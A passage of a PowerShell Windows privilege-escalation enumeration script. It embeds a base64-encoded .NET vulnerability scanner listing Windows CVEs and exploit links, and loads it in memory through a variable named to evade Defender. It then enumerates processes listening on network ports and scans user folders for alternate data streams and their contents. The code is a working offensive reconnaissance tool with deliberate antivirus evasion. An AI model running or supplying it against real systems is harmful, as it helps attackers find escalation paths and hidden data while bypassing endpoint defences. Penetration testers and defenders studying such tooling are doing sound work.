AcABvAHMAdAByAGUAYQBkAHcAcgBpAHQAZQAtAHIAYQBjAGUALQBjAG8AbgBkAGkAdABpAG8AbgAtAHAAZQAtAHcAaQB0AGgALQBkAGkAYQBnAGgAdQBiAC0AYwBvAGwAbABlAGMAdABvAHIALQBlAHgAcABsAG8AaQB0AC0AZgByAG8AbQAtAHMAdABhAG4AZABhAHIAZAAtAHUAcwBlAHIALQB0AG8ALQBzAHkAcwB0AGUAbQAvAAEbQwBWAEUALQAyADAAMQA5AC0AMAA4ADQAMQABVWgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AcgBvAGcAdQBlAC0AawBkAGMALwBDAFYARQAtADIAMAAxADkALQAwADgANAAxAAFTaAB0AHQAcABzADoALwAvAHIAYQBzAHQAYQBtAG8AdQBzAGUALgBtAGUALwB0AGEAZwBzAC8AYwB2AGUALQAyADAAMQA5AC0AMAA4ADQAMQAvAAEbQwBWAEUALQAyADAAMQA5AC0AMQAwADYANAABX2gAdAB0AHAAcwA6AC8ALwB3AHcAdwAuAHIAeQB0AGgAbQBzAHQAaQBjAGsALgBuAGUAdAAvAHAAbwBzAHQAcwAvAGMAdgBlAC0AMgAwADEAOQAtADEAMAA2ADQALwABG0MAVgBFAC0AMgAwADEAOQAtADEAMQAzADAAAV1oAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAFMAMwBjAHUAcgAzAFQAaAAxAHMAUwBoADEAdAAvAFMAaABhAHIAcABCAHkAZQBCAGUAYQByAAAbQwBWAEUALQAyADAAMQA5AC0AMQAyADUAMwABV2gAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AcABhAGQAbwB2AGEAaAA0AGMAawAvAEMAVgBFAC0AMgAwADEAOQAtADEAMgA1ADMAAU1oAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAHMAZwBhAGIAZQAvAEMAVgBFAC0AMgAwADEAOQAtADEAMgA1ADMAARtDAFYARQAtADIAMAAxADkALQAxADMAMQA1AAGAq2gAdAB0AHAAcwA6AC8ALwBvAGYAZgBzAGUAYwAuAGEAbABtAG8AbgBkAC4AYwBvAG4AcwB1AGwAdABpAG4AZwAvAHcAaQBuAGQAbwB3AHMALQBlAHIAcgBvAHIALQByAGUAcABvAHIAdABpAG4AZwAtAGEAcgBiAGkAdAByAGEAcgB5AC0AZgBpAGwAZQAtAG0AbwB2AGUALQBlAG8AcAAuAGgAdABtAGwAARtDAFYARQAtADIAMAAxADkALQAxADMAOAA1AAFXaAB0AHQAcABzADoALwAvAHcAdwB3AC4AeQBvAHUAdAB1AGIAZQAuAGMAbwBtAC8AdwBhAHQAYwBoAD8AdgA9AEsANgBnAEgAbgByAC0AVgBrAEEAZwABG0MAVgBFAC0AMgAwADEAOQAtADEAMwA4ADgAAVFoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAGoAYQBzADUAMAAyAG4ALwBDAFYARQAtADIAMAAxADkALQAxADMAOAA4AAEbQwBWAEUALQAyADAAMQA5AC0AMQA0ADAANQABgZFoAHQAdABwAHMAOgAvAC8AdwB3AHcALgBuAGMAYwBnAHIAbwB1AHAALgB0AHIAdQBzAHQALwB1AGsALwBhAGIAbwB1AHQALQB1AHMALwBuAGUAdwBzAHIAbwBvAG0ALQBhAG4AZAAtAGUAdgBlAG4AdABzAC8AYgBsAG8AZwBzAC8AMgAwADEAOQAvAG4AbwB2AGUAbQBiAGUAcgAvAGMAdgBlAC0AMgAwADEAOQAtADEANAAwADUALQBhAG4AZAAtAGMAdgBlAC0AMgAwADEAOQAtADEAMwAyADIALQBlAGwAZQB2AGEAdABpAG8AbgAtAHQAbwAtAHMAeQBzAHQAZQBtAC0AdgBpAGEALQB0AGgAZQAtAHUAcABuAHAALQBkAGUAdgBpAGMAZQAtAGgAbwBzAHQALQBzAGUAcgB2AGkAYwBlAC0AYQBuAGQALQB0AGgAZQAtAHUAcABkAGEAdABlAC0AbwByAGMAaABlAHMAdAByAGEAdABvAHIALQBzAGUAcgB2AGkAYwBlAC8AAUNoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAGEAcAB0ADYAOQAvAEMATwBNAGEAaABhAHcAawAAG0MAVgBFAC0AMgAwADIAMAAtADAANgA2ADgAAU1oAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAGkAdABtADQAbgAvAFMAeQBzAFQAcgBhAGMAaQBuAGcAUABvAGMAABtDAFYARQAtADIAMAAyADAALQAwADYAOAAzAAFXaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBwAGEAZABvAHYAYQBoADQAYwBrAC8AQwBWAEUALQAyADAAMgAwAC0AMAA2ADgAMwABgMNoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAFMAMwBjAHUAcgAzAFQAaAAxAHMAUwBoADEAdAAvAEMAcgBlAGQAcwAvAG0AYQBzAHQAZQByAC8AUABvAHcAZQByAHMAaABlAGwAbABTAGMAcgBpAHAAdABzAC8AYwB2AGUALQAyADAAMgAwAC0AMAA2ADgAMwAuAHAAcwAxAAEbQwBWAEUALQAyADAAMgAwAC0AMQAwADEAMwABgPNoAHQAdABwAHMAOgAvAC8AdwB3AHcALgBnAG8AcwBlAGMAdQByAGUALgBuAGUAdAAvAGIAbABvAGcALwAyADAAMgAwAC8AMAA5AC8AMAA4AC8AdwBzAHUAcwAtAGEAdAB0AGEAYwBrAHMALQBwAGEAcgB0AC0AMgAtAGMAdgBlAC0AMgAwADIAMAAtADEAMAAxADMALQBhAC0AdwBpAG4AZABvAHcAcwAtADEAMAAtAGwAbwBjAGEAbAAtAHAAcgBpAHYAaQBsAGUAZwBlAC0AZQBzAGMAYQBsAGEAdABpAG8AbgAtADEALQBkAGEAeQAvAAEJMQA1ADAANwAACTEANQAxADEAAAkxADYAMAA3AAAJMQA3ADAAMwAACTEANwAwADkAAAkxADgAMAAzAAAJMQA4ADAAOQAACTEAOQAwADMAAAkxADkAMAA5AAAJMgAwADAANAAANSAAWwAqAF0AIABPAFMAIABWAGUAcgBzAGkAbwBuADoAIAB7ADAAfQAgACgAewAxAH0AKQAAVyAAWwAhAF0AIABDAG8AdQBsAGQAIABuAG8AdAAgAHIAZQB0AHIAaQBlAHYAZQAgAFcAaQBuAGQAbwB3AHMAIABCAHUAaQBsAGQATgB1AG0AYgBlAHIAAEUgAFsAIQBdACAAVwBpAG4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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgAAAMAAAA9DwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        $RAS = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($defenderCantSeeMe))
        $OldConsoleOut = [Console]::Out
        $StringWriter = New-Object IO.StringWriter
        [Console]::SetOut($StringWriter)
        [W4ts0n.Program]::Main(@("-h"))
        [Console]::SetOut($OldConsoleOut)
        $Results = $StringWriter.ToString()
        $Results
    }
    catch {
        Write-Host "    [+] Failed to run Watson OS build too new" -ForegroundColor cyan
    }
}

function Get_NetworkPortInfo {
    Write-Host "`n[+] Checking open ports..." -ForegroundColor Yellow

    try {
        $seenPIDs = @{}
        $ignoreList = @(
            "svchost.exe", "lsass.exe", "wininit.exe", "csrss.exe", "services.exe", "winlogon.exe",
            "dwm.exe", "system idle process", "system", "smss.exe", "spoolsv.exe", "backgroundtaskhost.exe"
        )
        $procTable = @{}
        Get-CimInstance Win32_Process -ErrorAction Stop| ForEach-Object {
            $procTable[[int]$_.ProcessId] = $_
        }
        $netstatOutput = netstat -ano | Select-String "^(  )?(TCP|UDP)"
        $netConns = foreach ($line in $netstatOutput) {
            $parts = ($line -split '\s+') -ne ""
            
            if ($parts.Count -ge 4) {
                $proto = $parts[0]
                $local = $parts[1]
                $remote = $parts[2]
                $state = if ($proto -eq "TCP") { $parts[3] } else { "-" }
                $pid1 = if ($proto -eq "TCP") { $parts[4] } else { $parts[3] }

                if ($seenPIDs.ContainsKey($pid1)) { continue }
                $seenPIDs[$pid1] = $true
                $procInfo = $procTable[[int]$pid1]
                if ($procInfo) {
                    $isStandard = $ignoreList -contains $procInfo.Name.ToLower()
                    $hasCmdLine = -not [string]::IsNullOrWhiteSpace($procInfo.CommandLine)
                    if ($isStandard -and -not $hasCmdLine) { continue }

                    [PSCustomObject]@{
                        Protocol      = $proto
                        LocalAddress  = $local
                        RemoteAddress = $remote
                        State         = $state
                        PID           = $pid1
                        ProcessName   = $procInfo.Name
                        Path          = $procInfo.ExecutablePath
                        CommandLine   = $procInfo.CommandLine
                    }
                }
            }
        }
        write-host "$netConns"
        foreach ($conn in $netConns | Sort-Object Protocol, LocalAddress) {
            Write-Host "    [+] Potentially interesting network connection" -ForegroundColor Red
            $displayCmd = if ($conn.CommandLine.Length -gt 150) { $conn.CommandLine.Substring(0,150) + "..." } else { $conn.CommandLine }
            Write-Host "        Local Address: $($conn.LocalAddress)"
            Write-Host "        PID          : $($conn.PID)"
            Write-Host "        Process Name : $($conn.ProcessName)"
            if ($conn.CommandLine) {
                Write-Host "        Command Line : $displayCmd"
            }
        }
    } catch {
        Write-Host "    [!] Could not retrieve connection or process info." -ForegroundColor Cyan
    }
}
function Check_Files{
    Write-Host "`n[+] Scanning for non standard directories for files and ADS..." -ForegroundColor Yellow

    $usersPath = "C:\Users"
    Get-ChildItem -Path $usersPath -Directory -ErrorAction SilentlyContinue | ForEach-Object {
        $userDir = $_.FullName
        
        $files = Get-ChildItem -Path $userDir -Recurse -File -ErrorAction SilentlyContinue
        if ($files.Count -gt 0) {
            Write-Host "    [+] Found $($files.Count) files in $userDir" -ForegroundColor Red

            foreach ($file in $files) {
                # Get all streams except the default stream
                try{
                    $ads = Get-Item -Path $file.FullName -Stream * -ErrorAction SilentlyContinue |
                        Where-Object { $_.Stream -ne ':$DATA' -and $_.Stream -ne 'Zone.Identifier' }
                }catch{continue}
                if ($ads) {
                    foreach ($stream in $ads) {
                        $streamPath = "$($stream.FileName):$($stream.Stream)"
                        Write-Host "        [!] ADS found: $streamPath" -ForegroundColor Red
                        try {
                            $adsContent = Get-Content -Path $streamPath -ErrorAction Stop
                            if ($adsContent) {
                                Write-Host "            [+] ADS content (first 5 lines):"
